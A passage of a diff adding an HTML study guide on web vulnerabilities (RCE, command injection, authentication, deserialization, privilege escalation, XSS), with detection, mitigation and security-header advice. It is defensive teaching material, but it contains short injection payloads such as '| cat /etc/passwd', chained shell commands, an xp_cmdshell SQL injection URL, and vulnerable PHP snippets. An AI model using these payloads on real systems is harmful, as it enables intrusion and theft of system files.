+                      </li>
+                    </ul>
+                  </li>
+                  <li><strong>Deserialization Vulnerabilities</strong>: 
+                    <ul>
+                      <li>Example: A PHP application improperly deserializes user-controlled data, allowing an attacker to inject malicious objects that execute code.</li>
+                    </ul>
+                  </li>
+                  <li><strong>Server-Side Template Injection (SSTI)</strong>: 
+                    <ul>
+                      <li>Example: <code>http://example.com/page?name={{config}}</code> — Allows the attacker to execute server-side template code, which could lead to code execution.</li>
+                    </ul>
+                  </li>
+                  <li><strong>File Upload Vulnerabilities</strong>: 
+                    <ul>
+                      <li>Example: Uploading a PHP web shell like <code>shell.php</code> through an insecure file upload form allows the attacker to execute arbitrary PHP code.</li>
+                    </ul>
+                  </li>
+                  <li><strong>Buffer Overflow</strong>: 
+                    <ul>
+                      <li>Example: A C/C++ application that doesn’t properly handle input sizes, allowing an attacker to overwrite memory and execute arbitrary code.</li>
+                    </ul>
+                  </li>
+                  <li><strong>SQL Injection (RCE via SQL)</strong>: 
+                    <ul>
+                      <li>Example: <code>http://example.com/page?id=1; EXEC xp_cmdshell('dir')</code> — A SQL injection that allows the attacker to run system commands through the database.</li>
+                    </ul>
+                  </li>
+                  <li><strong>Cross-Site Scripting (XSS) Leading to RCE</strong>: 
+                    <ul>
+                      <li>Example: An attacker uses XSS to inject a script into a web page, which then allows the attacker to execute code on the victim's machine or escalate to server-side code execution.</li>
+                    </ul>
+                  </li>
+                  <li><strong>Privilege Escalation via RCE</strong>: 
+                    <ul>
+                      <li>Example: A vulnerability in a server allows an attacker with limited access to escalate privileges and execute arbitrary code as root or admin.</li>
+                    </ul>
+                  </li>
+                  <li><strong>Zero-Day Exploits</strong>: 
+                    <ul>
+                      <li>Example: Exploiting a previously unknown vulnerability in a web server software (e.g., Apache, nginx) that allows remote code execution.</li>
+                    </ul>
+                  </li>
+                </ul>
+
+                
+                <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                <ul>
+                  <li><strong>Content-Security-Policy (CSP)</strong>: 
+                    <ul>
+                      <li>Helps prevent the execution of malicious scripts and resources that could lead to RCE. It restricts which sources of content can be loaded.</li>
+                      <li>Example: <code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>Strict-Transport-Security (HSTS)</strong>: 
+                    <ul>
+                      <li>Enforces HTTPS and prevents downgrade attacks, ensuring that communication is secure and preventing attackers from intercepting traffic and exploiting RCE vulnerabilities.</li>
+                      <li>Example: <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>X-Content-Type-Options</strong>: 
+                    <ul>
+                      <li>Prevents browsers from interpreting files as a different MIME type, which could help prevent execution of files that might contain malicious code.</li>
+                      <li>Example: <code>X-Content-Type-Options: nosniff</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>X-XSS-Protection</strong>: 
+                    <ul>
+                      <li>Enables browser-based protections against XSS attacks, which could lead to remote code execution if exploited.</li>
+                      <li>Example: <code>X-XSS-Protection: 1; mode=block</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>Referrer-Policy</strong>: 
+                    <ul>
+                      <li>Controls the referrer data sent with requests, helping to reduce the risk of sensitive information being leaked or exploited during RCE attacks.</li>
+                      <li>Example: <code>Referrer-Policy: no-referrer-when-downgrade</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>X-Frame-Options</strong>: 
+                    <ul>
+                      <li>Prevents clickjacking, which is a technique that could be used to trick users into executing malicious code on their behalf.</li>
+                      <li>Example: <code>X-Frame-Options: DENY</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>Feature-Policy (or Permissions-Policy)</strong>: 
+                    <ul>
+                      <li>Restricts access to sensitive browser features that could be abused by attackers (e.g., camera, geolocation) in the context of RCE.</li>
+                      <li>Example: <code>Permissions-Policy: geolocation=(), microphone=()</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>Cache-Control</strong>: 
+                    <ul>
+                      <li>Prevents sensitive data from being cached, reducing the risk of caching malicious scripts that could trigger an RCE attack later.</li>
+                      <li>Example: <code>Cache-Control: no-store, no-cache, must-revalidate</code></li>
+                    </ul>
+                  </li>
+                  <li><strong>Set-Cookie</strong>: 
+                    <ul>
+                      <li>Secures cookies by setting flags like `HttpOnly`, `Secure`, and `SameSite`, preventing attackers from stealing session cookies and escalating privileges for RCE.</li>
+                      <li>Example: <code>Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict</code></li>
+                    </ul>
+                  </li>
+                </ul>
+                
+              </div>
+              
+
+
+                <div class="q">Command Injection</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>
+                  Executing arbitrary commands on the server via user input.
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect   </h5>
+                  <ul>
+                    <li><strong>Look for user input being passed to system calls</strong>: 
+                      <ul>
+                        <li>Inspect code for functions like <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, and <code>popen()</code> in PHP or equivalent functions in other languages.</li>
+                        <li>Example: <code>system($_GET['cmd']);</code> or <code>exec($user_input);</code></li>
+                      </ul>
+                    </li>
+                    <li><strong>Test for input manipulation</strong>: 
+                      <ul>
+                        <li>Try injecting common command injection payloads in user input fields like form inputs, URL parameters, or cookies.</li>
+                        <li>Example payloads: <code>; ls -la</code>, <code>| cat /etc/passwd</code>, <code>& echo vulnerable</code>.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Check error messages</strong>: 
+                      <ul>
+                        <li>Look for detailed error messages that might expose underlying system commands, file paths, or configuration, which can help you exploit command injection.</li>
+                        <li>Example: A message like "command not found" or a path to a system binary can reveal information.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Monitor network traffic</strong>: 
+                      <ul>
+                        <li>Monitor requests to the application for unusual patterns or payloads that may be used to trigger system-level commands or scripts.</li>
+                        <li>Look for URL parameters or headers that may pass system commands.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Check for OS-specific commands</strong>: 
+                      <ul>
+                        <li>Examine the application for platform-specific commands like <code>dir</code> (Windows), <code>ls</code> (Linux), or <code>whoami</code> (to detect the user running the process).</li>
+                      </ul>
+                    </li>
+                    <li><strong>Use automated tools</strong>: 
+                      <ul>
+                        <li>Run tools like **Burp Suite**, **OWASP ZAP**, or **Nikto** that can detect command injection vulnerabilities by testing various payloads automatically.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Review code for improper input handling</strong>: 
+                      <ul>
+                        <li>Look for areas in the application where input is passed directly to system calls without proper sanitization or escaping, such as directly concatenating user input into commands.</li>
+                      </ul>
+                    </li>
+                  </ul>
+
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <ul>
+                    <li><strong>Never pass unsanitized input</strong> into shell/system commands</li>
+                    <li><strong>Use language-native functions</strong> instead of shell commands 
+                      <ul>
+                        <li>Example: Use PHP’s <code>file_get_contents()</code> instead of <code>system('cat')</code></li>
+                      </ul>
+                    </li>
+                    <li><strong>Escape user input</strong> properly
+                      <ul>
+                        <li>Example: Use <code>escapeshellarg()</code> in PHP</li>
+                      </ul>
+                    </li>
+                    <li><strong>Apply least privilege</strong> to system users</li>
+                    <li><strong>Use input validation</strong> and <strong>allowlists</strong>
+                      <ul>
+                        <li>Validate that input contains only alphanumeric characters, with no other syntax or whitespace.</li>
+                      </ul>
+                    </li>
+                  </ul>
+
+                  
+                  <h5 style="background-color: #eccdcf;">Types</h5>
+                  <ul>
+                    <li><strong>Classic Command Injection</strong>: 
+                      <ul>
+                        <li>Occurs when user input is directly passed to a system shell without proper validation, allowing the attacker to execute arbitrary commands.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Blind Command Injection</strong>: 
+                      <ul>
+                        <li>Occurs when there is no direct feedback from the command execution, but attackers can still manipulate the application by observing indirect responses or behaviors.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Time-Based Command Injection</strong>: 
+                      <ul>
+                        <li>A form of blind injection where the attacker manipulates the system to execute a time-based delay, providing feedback based on the response time.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Error-Based Command Injection</strong>: 
+                      <ul>
+                        <li>Occurs when the system exposes error messages that provide hints about system commands or files, which attackers can use to inject malicious commands.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Chain Injection</strong>: 
+                      <ul>
+                        <li>Involves chaining multiple commands together using shell operators (e.g., <code>;</code>, <code>&</code>, <code>|</code>) to execute arbitrary code.</li>
+                      </ul>
+                    </li>
+                    <li><strong>File Injection via Command Injection</strong>: 
+                      <ul>
+                        <li>Allows attackers to inject files or URLs into system commands (e.g., using <code>curl</code> or <code>wget</code>) that contain malicious code.</li>
+                      </ul>
+                    </li>
+                  </ul>
+
+                  
+                  <h5 style="background-color: #eccdcf;">Example</h5>
+                  <ul>
+                    <li><strong>Classic Command Injection</strong>: 
+                      <ul>
+                        <li>Example: <code>system('ping ' . $_GET['ip']);</code> can be exploited by passing <code>127.0.0.1; ls</code> as input, causing the server to execute <code>ls</code>.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Blind Command Injection</strong>: 
+                      <ul>
+                        <li>Example: <code>exec('ping ' . $_GET['ip']);</code> might be exploited with input like <code>127.0.0.1 && whoami</code>, but without any visible output, the attacker can infer system details based on response time.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Time-Based Command Injection</strong>: 
+                      <ul>
+                        <li>Example: <code>exec('ping ' . $_GET['ip']);</code> might be exploited with input like <code>127.0.0.1; sleep 5</code>, and the attacker can detect a delay to confirm the injection worked.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Error-Based Command Injection</strong>: 
+                      <ul>
+                        <li>Example: <code>system('cat ' . $_GET['file']);</code> might throw an error revealing file paths or command details, which could be exploited further.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Chain Injection</strong>: 
+                      <ul>
+                        <li>Example: <code>exec('ping ' . $_GET['ip']);</code> could be injected with <code>127.0.0.1; ls</code> to execute both the ping and <code>ls</code> commands.</li>
+                      </ul>
+                    </li>
+                    <li><strong>File Injection via Command Injection</strong>: 
+                      <ul>
+                        <li>Example: <code>system('wget ' . $_GET['url']);</code> could be exploited with a malicious URL to download and execute a malicious script.</li>
+                      </ul>
+                    </li>
+                  </ul>
+
+                  
+                  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                  <ul>
+                    <li><strong>Content-Security-Policy (CSP)</strong>: 
+                      <ul>
+                        <li>Helps prevent malicious script injection by controlling which resources can be loaded. This can block payloads that may exploit command injection through cross-site scripting (XSS).</li>
+                        <li>Example: <code>Content-Security-Policy: default-src 'self';</code></li>
+                      </ul>
+                    </li>
+                    <li><strong>Strict-Transport-Security (HSTS)</strong>: 
+                      <ul>
+                        <li>Forces secure HTTPS connections and prevents man-in-the-middle attacks that could inject malicious commands into requests or responses.</li>
+                        <li>Example: <code>Strict-Transport-Security: max-age=31536000; includeSubDomains;</code></li>
+                      </ul>
+                    </li>
+                    <li><strong>X-Content-Type-Options</strong>: 
+                      <ul>
+                        <li>Prevents MIME type sniffing by browsers, ensuring that scripts or commands cannot be executed when content types are incorrectly interpreted.</li>
+                        <li>Example: <code>X-Content-Type-Options: nosniff;</code></li>
+                      </ul>
+                    </li>
+                    <li><strong>X-Frame-Options</strong>: 
+                      <ul>
+                        <li>Prevents clickjacking attacks that might facilitate user interaction with hidden forms that can send crafted input leading to command injection.</li>
+                        <li>Example: <code>X-Frame-Options: DENY;</code></li>
+                      </ul>
+                    </li>
+                    <li><strong>Referrer-Policy</strong>: 
+                      <ul>
+                        <li>Reduces the risk of referrer data leakage that might include sensitive system information used for injecting malicious commands.</li>
+                        <li>Example: <code>Referrer-Policy: no-referrer-when-downgrade;</code></li>
+                      </ul>
+                    </li>
+                    <li><strong>Cache-Control</strong>: 
+                      <ul>
+                        <li>Helps prevent caching of sensitive information that might be exploited for command injection via cached responses.</li>
+                        <li>Example: <code>Cache-Control: no-store;</code></li>
+                      </ul>
+                    </li>
+                  </ul>
+                  
+                </div>
+
+
+
+                <div class="q">Broken Authentication</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>
+                  <p>Broken Authentication refers to weaknesses in the authentication mechanisms of an application that allow attackers to bypass or exploit flaws, leading to unauthorized access to sensitive data or systems. Common issues include weak password policies, flawed session management, and lack of multi-factor authentication.</p>
+                
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+                  <ul>
+                    <li><strong>Weak Password Policies</strong>: Check if the system allows users to set weak passwords (e.g., "123456" or "password").</li>
+                    <li><strong>Session Management Flaws</strong>: Test for session fixation, session hijacking, and poor session expiration.</li>
+                    <li><strong>Missing Multi-factor Authentication (MFA)</strong>: Check if the application offers or enforces MFA for sensitive actions or logins.</li>
+                    <li><strong>Improper Logout Mechanisms</strong>: Ensure that sessions are properly terminated after logout and that session tokens are invalidated.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <ul>
+                    <li><strong>Enforce Strong Password Policies</strong>: Require strong, unique passwords (minimum length, mixed case, numbers, special characters).</li>
+                    <li><strong>Implement Multi-Factor Authentication (MFA)</strong>: Use multiple factors to authenticate users (e.g., something they know, something they have, or something they are).</li>
+                    <li><strong>Secure Session Management</strong>: Ensure proper session expiration, secure cookies, and prevent session hijacking.</li>
+                    <li><strong>Logout Mechanism</strong>: Ensure that users are logged out properly, and session tokens are invalidated immediately.</li>
+                    <li><strong>Limit Failed Login Attempts</strong>: Implement account lockout mechanisms or delays after several failed login attempts to prevent brute-force attacks.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Types</h5>
+                  <ul>
+                    <li><strong>Session Fixation</strong>: An attacker forces a user to authenticate with a known session ID.</li>
+                    <li><strong>Credential Stuffing</strong>: Attackers use previously stolen credentials to automate login attempts.</li>
+                    <li><strong>Brute Force Attacks</strong>: Repeatedly trying passwords to guess the correct one.</li>
+                    <li><strong>Unvalidated Redirects and Forwards</strong>: Attackers can redirect users to malicious sites after login.</li>
+                    <li><strong>Insufficient Session Expiration</strong>: Session tokens are not invalidated after logout or timeout, allowing attackers to reuse the session.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Example</h5>
+                  <ul>
+                    <li><strong>Weak Password</strong>: A user sets their password as "password123", which is easily guessable in a brute-force attack.</li>
+                    <li><strong>Session Fixation</strong>: An attacker sets a session ID for a victim, and when the victim logs in, the attacker can hijack the session.</li>
+                    <li><strong>Brute Force</strong>: Attackers use automated tools to guess passwords, trying thousands of common combinations in a short time.</li>
+                    <li><strong>Missing MFA</strong>: An attacker successfully logs in using only the victim's username and password, with no second authentication factor.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                  <ul>
+                    <li><strong>Strict-Transport-Security (HSTS)</strong>: Enforces HTTPS to prevent attackers from intercepting authentication data through man-in-the-middle attacks.</li>
+                    <li><strong>Content-Security-Policy (CSP)</strong>: Prevents malicious scripts from executing, which could be used to steal session tokens or bypass authentication mechanisms.</li>
+                    <li><strong>X-Frame-Options</strong>: Prevents the login page from being embedded in a frame, mitigating clickjacking attacks that could steal authentication credentials.</li>
+                    <li><strong>X-XSS-Protection</strong>: Prevents some cross-site scripting (XSS) attacks that could target authentication fields.</li>
+                  </ul>
+                </div>
+                
+                <div class="q">Sensitive Data Exposure</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>
+                  <p>Sensitive Data Exposure occurs when sensitive information, such as passwords, credit card details, or personal data, is not adequately protected during transmission or storage, making it vulnerable to theft or misuse.</p>
+                
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+                  <ul>
+                    <li><strong>Unencrypted Data Transmission</strong>: Check if sensitive data (e.g., passwords, credit card numbers) is transmitted over HTTP instead of HTTPS.</li>
+                    <li><strong>Weak Encryption</strong>: Inspect stored sensitive data to ensure it’s properly encrypted (e.g., weak encryption algorithms like MD5 or outdated ciphers).</li>
+                    <li><strong>Unprotected API Endpoints</strong>: Look for APIs that transmit sensitive data without encryption or proper authentication.</li>
+                    <li><strong>Exposed Sensitive Data in URLs</strong>: Check if sensitive data such as tokens, passwords, or session IDs appear in URLs, query parameters, or logs.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <ul>
+                    <li><strong>Use HTTPS for All Data Transmission</strong>: Ensure that all sensitive data is transmitted over HTTPS to protect it from man-in-the-middle attacks.</li>
+                    <li><strong>Encrypt Sensitive Data at Rest</strong>: Store sensitive information using strong encryption algorithms (e.g., AES-256).</li>
+                    <li><strong>Secure APIs with Authentication and Encryption</strong>: Require proper authentication for APIs and use encryption to protect sensitive data in transit.</li>
+                    <li><strong>Never Expose Sensitive Data in URLs</strong>: Avoid placing sensitive information in URLs, query parameters, or logs.</li>
+                    <li><strong>Use Strong Password Storage Techniques</strong>: Use salted and hashed passwords (e.g., bcrypt, scrypt) rather than storing them in plaintext.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Types</h5>
+                  <ul>
+                    <li><strong>Unencrypted Communication</strong>: Data sent over HTTP without encryption, making it susceptible to interception.</li>
+                    <li><strong>Weak Encryption</strong>: Using outdated or weak encryption algorithms (e.g., MD5, DES) to protect sensitive data.</li>
+                    <li><strong>Exposed Sensitive Data in URLs</strong>: Sending sensitive data (like session tokens or passwords) in URLs or HTTP headers.</li>
+                    <li><strong>Insecure Data Storage</strong>: Storing sensitive information without proper encryption or access controls.</li>
+                    <li><strong>Insecure API Endpoints</strong>: APIs that do not properly authenticate or encrypt sensitive data.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Example</h5>
+                  <ul>
+                    <li><strong>Unencrypted Login Form</strong>: A login page transmits usernames and passwords over HTTP instead of HTTPS, allowing attackers to intercept the credentials.</li>
+                    <li><strong>Exposed Credit Card Info</strong>: A website stores credit card numbers in plaintext in a database.</li>
+                    <li><strong>Session Token in URL</strong>: A web application passes a session ID or token as part of the URL query string, exposing it in browser history or logs.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                  <ul>
+                    <li><strong>Strict-Transport-Security (HSTS)</strong>: Ensures the use of HTTPS by enforcing it on browsers for all connections to the website.</li>
+                    <li><strong>Content-Security-Policy (CSP)</strong>: Helps prevent the loading of malicious content that could exfiltrate sensitive data.</li>
+                    <li><strong>X-Content-Type-Options</strong>: Prevents browsers from interpreting files as a different MIME type, which could potentially expose sensitive data.</li>
+                    <li><strong>Cache-Control</strong>: Prevents sensitive information from being cached by browsers or intermediate caches, ensuring it’s not exposed in the future.</li>
+                  </ul>
+                </div>
+                
+                <div class="q">Insecure Deserialization</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>
+                  <p>Insecure deserialization occurs when an application deserializes untrusted or malicious data without proper validation or integrity checks. This can lead to remote code execution (RCE), data tampering, or other attacks, as attackers may modify serialized data to exploit vulnerabilities in the deserialization process.</p>
+                
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+                  <ul>
+                    <li><strong>Unvalidated Deserialization</strong>: Check if user input is deserialized directly without any validation or verification of integrity.</li>
+                    <li><strong>Exploitable Deserialization Points</strong>: Look for endpoints that accept serialized objects (e.g., JSON, XML, or binary formats) and analyze how the data is processed.</li>
+                    <li><strong>Untrusted Data Sources</strong>: Identify if data is coming from untrusted or user-controlled sources, such as URL parameters, cookies, or HTTP requests.</li>
+                    <li><strong>Use of Insecure Libraries</strong>: Inspect code for the use of deserialization libraries known to have vulnerabilities or are prone to exploitation when improperly used.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <ul>
+                    <li><strong>Use Strong Input Validation</strong>: Always validate and sanitize input before deserialization, ensuring it matches the expected format and does not contain malicious payloads.</li>
+                    <li><strong>Implement Integrity Checks</strong>: Use digital signatures or hashes to verify that the serialized data has not been tampered with before deserializing it.</li>
+                    <li><strong>Avoid Serialization of Sensitive Data</strong>: Avoid serializing sensitive or critical objects like passwords, session tokens, or encryption keys.</li>
+                    <li><strong>Use Safe Deserialization Libraries</strong>: Use libraries or frameworks that offer secure deserialization mechanisms, and avoid custom deserialization code.</li>
+                    <li><strong>Disable Deserialization of Untrusted Data</strong>: If possible, disable or restrict the deserialization of untrusted data or data coming from untrusted sources.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Types</h5>
+                  <ul>
+                    <li><strong>Remote Code Execution (RCE)</strong>: Deserializing malicious data that can exploit vulnerabilities to execute arbitrary code on the server.</li>
+                    <li><strong>Object Injection</strong>: Malicious objects can be injected into a program to alter application behavior, leading to vulnerabilities such as privilege escalation.</li>
+                    <li><strong>Data Tampering</strong>: Attackers can modify the serialized data to change its content, potentially altering application logic or state.</li>
+                    <li><strong>Denial of Service (DoS)</strong>: Maliciously crafted serialized data can trigger a DoS attack, causing the application to crash or consume excessive resources.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Example</h5>
+                  <ul>
+                    <li><strong>RCE via Insecure Deserialization</strong>: An attacker sends a crafted serialized object containing malicious code to a vulnerable application, leading to remote code execution.</li>
+                    <li><strong>Object Injection</strong>: An attacker sends a specially crafted object in a request, causing the application to execute unintended actions or alter critical application logic.</li>
+                    <li><strong>Data Tampering</strong>: A user modifies the serialized data in a session cookie to escalate their privileges or bypass security checks.</li>
+                    <li><strong>DoS via Malformed Data</strong>: An attacker sends a corrupted or excessively large serialized object, causing the application to crash or consume too many resources during deserialization.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                  <ul>
+                    <li><strong>Strict-Transport-Security (HSTS)</strong>: Forces HTTPS to prevent man-in-the-middle attacks that could tamper with serialized data in transit.</li>
+                    <li><strong>Content-Security-Policy (CSP)</strong>: Helps mitigate the risk of cross-site scripting (XSS) and other injection attacks that could be used to exploit insecure deserialization.</li>
+                    <li><strong>X-Content-Type-Options</strong>: Prevents MIME type sniffing, ensuring that the content is correctly identified and reducing the risk of malicious payloads being executed.</li>
+                    <li><strong>Referrer-Policy</strong>: Helps protect against leaks of sensitive data, especially in serialized forms, through the referrer header in requests.</li>
+                  </ul>
+                </div>
+
+                
+                <div class="q">Privilege Escalation</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>Privilege escalation is the act of exploiting a vulnerability to gain higher-level privileges or access rights than what the user or process is authorized for, typically escalating from normal user to admin or root access. This can lead to a full compromise of the system or application.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <ul>
+    <li><strong>Excessive User Permissions</strong>: Check for users or processes with excessive privileges (e.g., unnecessary administrative access).</li>
+    <li><strong>Vulnerable Software Versions</strong>: Identify outdated software or services that may have known vulnerabilities that could be exploited to gain elevated privileges.</li>
+    <li><strong>Improperly Configured Access Controls</strong>: Look for weak access control mechanisms or misconfigured role-based access (RBAC) systems.</li>
+    <li><strong>Insecure User Inputs</strong>: Detect input fields or parameters that can be manipulated to escalate privileges, such as modifying request headers or URL parameters.</li>
+    <li><strong>Unrestricted File Access</strong>: Check for unprotected file paths or services that can be accessed by unauthorized users, leading to privilege escalation.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li><strong>Principle of Least Privilege</strong>: Ensure users and processes only have the minimum permissions necessary for their role or function.</li>
+    <li><strong>Regular Patch Management</strong>: Apply security patches and updates regularly to close known vulnerabilities that could lead to privilege escalation.</li>
+    <li><strong>Access Control and RBAC</strong>: Implement robust access control and role-based access control (RBAC) mechanisms to enforce proper segregation of duties and limit privilege access.</li>
+    <li><strong>Secure Configuration</strong>: Regularly audit and secure system configurations to ensure they are not misconfigured in a way that allows privilege escalation.</li>
+    <li><strong>Multi-factor Authentication (MFA)</strong>: Use multi-factor authentication to secure accounts with high privileges, reducing the risk of privilege escalation via compromised credentials.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li><strong>Vertical Privilege Escalation</strong>: Gaining higher-level access (e.g., user to admin or root access).</li>
+    <li><strong>Horizontal Privilege Escalation</strong>: Gaining access to another user’s resources at the same privilege level (e.g., accessing another user’s account).</li>
+    <li><strong>Exploitation of Vulnerabilities</strong>: Exploiting bugs or misconfigurations in the operating system, applications, or services to escalate privileges.</li>
+    <li><strong>Credential Stuffing</strong>: Using stolen credentials to gain elevated access on an application or service.</li>
+    <li><strong>Insecure Deserialization</strong>: Exploiting deserialization vulnerabilities to gain higher privileges within the application or system.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <ul>
+    <li><strong>Exploiting a Vulnerability</strong>: An attacker exploiting a buffer overflow in a service running with root privileges to execute arbitrary code as root.</li>
+    <li><strong>Misconfigured Access Control</strong>: A user with basic access modifying URL parameters or HTTP headers to gain access to an admin panel.</li>
+    <li><strong>Weak File Permissions</strong>: An attacker exploiting weak file permissions to overwrite a sensitive file and gain elevated privileges.</li>
+    <li><strong>Privilege Escalation through Unpatched Software</strong>: An attacker using a known exploit in an outdated software package to escalate from a normal user to an administrator.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <ul>
+    <li><strong>Strict-Transport-Security (HSTS)</strong>: Forces the use of HTTPS, preventing attackers from intercepting or tampering with communication channels that could be used for privilege escalation.</li>
+    <li><strong>Content-Security-Policy (CSP)</strong>: Mitigates the risk of cross-site scripting (XSS) attacks that could lead to privilege escalation by injecting malicious scripts into the application.</li>
+    <li><strong>X-Content-Type-Options</strong>: Prevents browsers from interpreting files in unexpected ways, which could be used in attacks that facilitate privilege escalation.</li>
+    <li><strong>X-Frame-Options</strong>: Helps prevent clickjacking attacks that could be used for social engineering attacks aimed at escalating privileges.</li>
+    <li><strong>X-XSS-Protection</strong>: Prevents some forms of cross-site scripting (XSS) attacks that might be exploited for privilege escalation in certain scenarios.</li>
+  </ul>
+</div>
+
+
+
+
+
+<br>
+                <h4>Client-Side Vulnerabilities</h4>
+                <p>Client-Side: Affects the user’s browser and data storage</p>
+                <p><strong>Mitigation:</strong> Content Security Policy (CSP) to control which scripts can run; not store sensitive data on the client side; Validate and sanitize inputs before sending to the server. </p>
+
+
+                <div class="q">XSS</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>
+                  <p>Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into web pages viewed by other users. These scripts can be executed in the victim’s browser, allowing the attacker to steal cookies, session tokens, or manipulate the DOM to perform unauthorized actions.</p>
+                
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+                  <ul>
+                    <li><strong>Input Fields</strong>: Look for unsanitized input fields (e.g., search boxes, comment sections) where user input is reflected on the page.</li>
+                    <li><strong>Unescaped Data in HTML</strong>: Check if user input is included directly into HTML without proper escaping or sanitization.</li>
+                    <li><strong>Dynamic Content Rendering</strong>: Examine how data is dynamically inserted into web pages (e.g., using JavaScript or AJAX) and check if it’s sanitized.</li>
+                    <li><strong>Browser Developer Tools</strong>: Use tools like the browser’s developer console to inject payloads and observe if they are executed in the DOM.</li>
+                    <li><strong>URL Parameters</strong>: Analyze URL parameters that might reflect unsanitized user input in the response, allowing potential script injection.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <ul>
+                    <li><strong>Input Validation and Sanitization</strong>: Sanitize and validate user input to ensure it does not contain executable code, such as JavaScript.</li>
+                    <li><strong>Contextual Output Encoding</strong>: Encode data before embedding it in HTML, JavaScript, or other contexts to prevent the execution of injected scripts.</li>
+                    <li><strong>Use of CSP (Content Security Policy)</strong>: Implement a strict Content Security Policy (CSP) to limit where scripts can be loaded from and block inline scripts.</li>
+                    <li><strong>HTTPOnly and Secure Cookies</strong>: Use the `HttpOnly` flag to prevent client-side access to session cookies and the `Secure` flag to ensure cookies are transmitted over HTTPS.</li>
+                    <li><strong>Cross-Origin Resource Sharing (CORS)</strong>: Use CORS to control which domains can interact with your application and prevent unauthorized script access.</li>
+                  </ul>
+                
+                  <h5 style="background-color: #eccdcf;">Types</h5>
+                  <ul>
+                    <li><strong>Stored XSS</strong>:
+                      <ul>
+                        <li><strong>Server-side</strong>: Malicious scripts are permanently stored on the server (e.g., in a database) and executed when the affected page is loaded by a victim.</li>
+                      </ul>
+                    </li>
+                    <li><strong>Reflected XSS</strong>:
+                      <ul>
+                        <li><strong>Server-side</strong>: Malicious scripts are reflected off a web server and executed immediately as part of the response (e.g., through a URL or search query).</li>
+                      </ul>
+                    </li>
+                    <li><strong>DOM-Based XSS</strong>:
+                      <ul>
+                        <li><strong>Client-side</strong>: The attack is executed by manipulating the DOM (Document Object Model) in the victim’s browser, without any server-side interaction.</li>
+                      </ul>
+                    </li>
+                  </ul>
+                  
+                
+                  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                  <ul>
+                    <li><strong>Content-Security-Policy (CSP)</strong>: CSP restricts where scripts can be loaded from, preventing inline scripts and reducing the risk of XSS attacks.</li>
+                    <li><strong>X-XSS-Protection</strong>: A browser header that helps mitigate reflected XSS attacks by enabling built-in protections in modern browsers.</li>
+                    <li><strong>X-Content-Type-Options</strong>: Prevents the browser from interpreting files as a different MIME type, which could be used for XSS attacks.</li>
+                    <li><strong>Strict-Transport-Security (HSTS)</strong>: Ensures that communication between the client and server is secure, preventing man-in-the-middle attacks that could inject malicious scripts.</li>
+                  </ul>
+                </div>
+                
+
+                <div class="q">Cross-Site Request Forgery (CSRF)</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
